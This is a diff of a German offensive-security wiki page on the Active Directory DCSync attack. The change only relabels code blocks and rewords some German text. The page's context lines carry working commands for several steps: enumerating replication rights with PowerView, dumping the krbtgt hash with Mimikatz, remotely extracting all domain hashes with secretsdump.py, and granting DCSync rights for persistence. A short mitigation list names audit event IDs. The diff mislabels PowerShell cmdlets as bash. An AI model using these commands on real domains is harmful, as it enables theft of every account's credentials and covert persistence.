@@ -15,15 +15,15 @@ Die **DCSync**-Berechtigung impliziert, dass man diese Berechtigungen über die 
 ### Enumeration
 
 Überprüfen Sie, wer diese Berechtigungen hat, indem Sie `powerview` verwenden:
-```powershell
+```bash
 Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
 ```
 ### Lokal ausnutzen
-```powershell
+```bash
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 ```
 ### Exploitieren aus der Ferne
-```powershell
+```bash
 secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
 [-just-dc-user <USERNAME>] #To get only of that user
 [-pwd-last-set] #To see when each account's password was last changed
@@ -35,25 +35,25 @@ secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
 - eine mit den **Kerberos-Schlüsseln**
 - eine mit Klartext-Passwörtern aus dem NTDS für alle Konten, bei denen [**umkehrbare Verschlüsselung**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) aktiviert ist. Sie können Benutzer mit umkehrbarer Verschlüsselung mit
 
-```powershell
+```bash
 Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
 ```
 
 ### Persistenz
 
 Wenn Sie ein Domänenadministrator sind, können Sie diese Berechtigungen mit Hilfe von `powerview` jedem Benutzer gewähren:
-```powershell
+```bash
 Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
 ```
-Dann können Sie **überprüfen, ob der Benutzer korrekt** die 3 Berechtigungen zugewiesen bekam, indem Sie nach ihnen in der Ausgabe suchen (Sie sollten die Namen der Berechtigungen im Feld "ObjectType" sehen können):
-```powershell
+Dann können Sie **überprüfen, ob der Benutzer korrekt** die 3 Berechtigungen zugewiesen wurde, indem Sie sie im Output suchen (Sie sollten die Namen der Berechtigungen im Feld "ObjectType" sehen können):
+```bash
 Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
 ```
 ### Minderung
 
-- Sicherheitsereignis-ID 4662 (Audit-Policy für Objekt muss aktiviert sein) – Eine Operation wurde an einem Objekt durchgeführt
-- Sicherheitsereignis-ID 5136 (Audit-Policy für Objekt muss aktiviert sein) – Ein Verzeichnisdienstobjekt wurde geändert
-- Sicherheitsereignis-ID 4670 (Audit-Policy für Objekt muss aktiviert sein) – Berechtigungen auf einem Objekt wurden geändert
+- Sicherheitsereignis-ID 4662 (Audit-Richtlinie für Objekt muss aktiviert sein) – Eine Operation wurde an einem Objekt durchgeführt
+- Sicherheitsereignis-ID 5136 (Audit-Richtlinie für Objekt muss aktiviert sein) – Ein Verzeichnisdienstobjekt wurde geändert
+- Sicherheitsereignis-ID 4670 (Audit-Richtlinie für Objekt muss aktiviert sein) – Berechtigungen auf einem Objekt wurden geändert
 - AD ACL Scanner - Erstellen und Vergleichen von Berichten über ACLs. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)
 
 ## Referenzen
